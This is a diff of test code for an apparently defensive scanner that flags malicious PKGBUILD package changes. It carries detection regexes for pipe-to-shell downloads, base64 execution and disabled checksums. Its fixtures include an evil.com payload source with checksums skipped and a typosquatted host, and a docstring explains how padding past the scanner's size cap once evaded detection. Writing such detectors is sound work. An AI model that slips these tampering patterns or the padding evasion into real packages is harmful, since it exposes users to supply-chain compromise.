@@ -1,16 +1,10 @@
-FULL_RULES = [
-    {"id": "R001", "name": "Remote Script Execution", "pattern": r"curl.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R002", "name": "Wget Pipe to Shell", "pattern": r"wget.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R003", "name": "Base64 Decode and Execute", "pattern": r"base64.*\-d.*\|", "severity": "CRITICAL", "category": "obfuscation", "match_target": "resolved"},
-    {"id": "R004", "name": "Checksum Disabled", "pattern": r"sha256sums\s*=\s*\(?\s*['\"]?(?:SKIP|NONE)['\"]?", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
-    {"id": "R005", "name": "Checksum Emptied", "pattern": r"sha256sums\s*=\s*\(\s*\)", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
-    {"id": "R006", "name": "Insecure Download Protocol", "pattern": r"https?://.*\.tar\.gz.*\|", "severity": "MEDIUM", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R007", "name": "Install File Modification", "pattern": r"\+.*\.install.*", "severity": "MEDIUM", "category": "installer", "match_target": "raw_line"},
-    {"id": "R008", "name": "Unexpected File Download", "pattern": r"\b(python|ruby|perl)\s+-c\s+https?://", "severity": "HIGH", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "raw_line", "scope": ["function_body"]},
-    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
-    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
-]
+from tests.conftest import SHARED_RULES
+from trustsight.differ import extract_urls_from_diff
+from trustsight.tokenizer import tokenize_and_resolve
+from trustsight.rules import apply_rules, get_raw_diff_lines
+from trustsight.buckets import classify_urls
+from trustsight.scoring import calculate_score
+from trustsight.schema import NoveltyContext
 
 
 def test_analysis_imports():
@@ -30,13 +24,6 @@ def test_analysis_imports():
 
 
 def test_pipeline_stage_integration():
-    from trustsight.differ import extract_urls_from_diff
-    from trustsight.tokenizer import tokenize_and_resolve
-    from trustsight.rules import apply_rules, get_raw_diff_lines
-    from trustsight.buckets import classify_urls
-    from trustsight.scoring import calculate_score
-    from trustsight.schema import NoveltyContext
-
     diff = """+source=("https://evil.com/payload.tar.gz")
 +sha256sums=('SKIP')
 +package() {
@@ -54,7 +41,7 @@ def test_pipeline_stage_integration():
     resolved, unresolved = tokenize_and_resolve(diff)
     raw_lines = get_raw_diff_lines(diff)
 
-    triggered = apply_rules(resolved, raw_lines, FULL_RULES)
+    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)
     rule_ids = [r["rule_id"] for r in triggered]
     assert "R001" in rule_ids
     assert "R004" in rule_ids
@@ -75,13 +62,6 @@ def test_pipeline_stage_integration():
 
 
 def test_pipeline_benign_package():
-    from trustsight.differ import extract_urls_from_diff
-    from trustsight.tokenizer import tokenize_and_resolve
-    from trustsight.rules import apply_rules, get_raw_diff_lines
-    from trustsight.buckets import classify_urls
-    from trustsight.scoring import calculate_score
-    from trustsight.schema import NoveltyContext
-
     diff = """+pkgver=2.0.0
 +pkgrel=2
 +source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
@@ -96,7 +76,7 @@ def test_pipeline_benign_package():
 
     resolved, unresolved = tokenize_and_resolve(diff)
     raw_lines = get_raw_diff_lines(diff)
-    triggered = apply_rules(resolved, raw_lines, FULL_RULES)
+    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)
 
     config = {
         "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
@@ -109,13 +89,6 @@ def test_pipeline_benign_package():
 
 
 def test_pipeline_subtly_malicious():
-    from trustsight.differ import extract_urls_from_diff
-    from trustsight.tokenizer import tokenize_and_resolve
-    from trustsight.rules import apply_rules, get_raw_diff_lines
-    from trustsight.buckets import classify_urls
-    from trustsight.scoring import calculate_score
-    from trustsight.schema import NoveltyContext
-
     diff = """-source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
 +source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
 -sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
@@ -129,7 +102,7 @@ def test_pipeline_subtly_malicious():
 
     resolved, unresolved = tokenize_and_resolve(diff)
     raw_lines = get_raw_diff_lines(diff)
-    triggered = apply_rules(resolved, raw_lines, FULL_RULES)
+    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)
     rule_ids = [r["rule_id"] for r in triggered]
     assert "R004" in rule_ids
 
@@ -144,13 +117,6 @@ def test_pipeline_subtly_malicious():
 
 
 def test_pipeline_hard_to_spot_malicious():
-    from trustsight.differ import extract_urls_from_diff
-    from trustsight.tokenizer import tokenize_and_resolve
-    from trustsight.rules import apply_rules, get_raw_diff_lines
-    from trustsight.buckets import classify_urls
-    from trustsight.scoring import calculate_score
-    from trustsight.schema import NoveltyContext
-
     diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
 +source=("https://githab.com/trusted/project/archive/v2.0.0.tar.gz")"""
 
@@ -280,3 +246,20 @@ def test_scan_diff_ors_novelty_across_multiple_urls():
     )
     fact = scan_diff(both, rules=[], config=cfg, package_name="p", seen_urls=seen)
     assert fact.novelty_context.url_first_seen_globally is True
+
+
+def test_a_truncated_diff_is_marked_as_such():
+    """A diff past the size cap must not report as fully vetted.
+
+    Only the first max_diff_bytes are analysed, so padding a diff past
+    the cap and appending the payload scored 0 (clean) where the whole
+    diff scored 75.  The flag lets the report say the change was only
+    partly examined.
+    """
+    from trustsight.schema import PackageFact
+
+    assert PackageFact().diff_truncated is False
+
+    from trustsight.schema import fact_to_dict
+    fact = PackageFact(package_name="p", diff_truncated=True)
+    assert fact_to_dict(fact)["diff_truncated"] is True
